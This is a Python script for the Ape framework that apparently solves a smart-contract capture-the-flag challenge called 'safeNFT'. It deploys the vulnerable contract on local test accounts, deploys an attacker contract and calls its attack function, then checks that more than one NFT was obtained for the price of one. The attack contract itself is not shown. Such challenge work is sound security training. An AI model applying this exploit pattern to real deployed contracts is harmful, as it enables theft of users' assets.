from ape import accounts, project, networks


w3 = networks.provider.web3
TOKEN_PRICE = w3.to_wei(0.01, "ether")


def set_up():
    print("\n--- Setting up scenario ---\n")

    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    print("\n--- Deploying challenge contract ---\n")
    safe_nft = project.safeNFT.deploy("safeNFT", "sNFT", TOKEN_PRICE, sender=deployer)

    # assert correct state of contract
    print("\n--- Ensuring the contract has the correct initial state ---\n")
    assert safe_nft.name() == "safeNFT"
    assert safe_nft.symbol() == "sNFT"
    assert int(w3.eth.get_storage_at(safe_nft.address, 10).hex(), 0) == TOKEN_PRICE

    return attacker, safe_nft


def main():
    attacker, safe_nft = set_up()

    print("\n--- Running exploit... ---\n")

    # deployer attacker contract
    attacker_contract = project.safeNFTAttacker.deploy(
        safe_nft.address, sender=attacker
    )

    # call attack funciton in contract
    attacker_contract.attack(sender=attacker, value=TOKEN_PRICE)

    # assert attacker contract has more than one NFT
    assert safe_nft.balanceOf(attacker_contract.address) > 1

    print(
        f"\n--- We bought {safe_nft.balanceOf(attacker_contract.address)} NFTs for the price of 1 ---\n"
    )

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
